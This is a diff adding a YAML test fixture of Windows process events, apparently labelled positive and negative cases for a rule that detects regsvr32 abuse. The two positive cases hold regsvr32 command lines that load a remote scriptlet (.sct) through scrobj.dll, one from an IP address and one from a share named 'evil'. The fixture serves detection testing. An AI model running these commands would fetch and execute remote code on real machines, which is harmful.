@@ -1,0 +1,37 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: regsvr32.exe, executable: 'C:\Windows\System32\regsvr32.exe', command_line: 'regsvr32 /s /n /u /i:http://203.0.113.9/f.sct
+        scrobj.dll'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: regsvr32.exe, executable: 'C:\Windows\System32\regsvr32.exe', command_line: 'regsvr32 /s /i:\\evil\share\x.sct
+        scrobj.dll'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: regsvr32.exe, executable: 'C:\Windows\System32\regsvr32.exe', command_line: 'regsvr32 /s C:\Windows\System32\vbscript.dll'}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: regsvr32.exe, executable: 'C:\Windows\System32\regsvr32.exe', command_line: regsvr32 /u /s msxml6.dll}
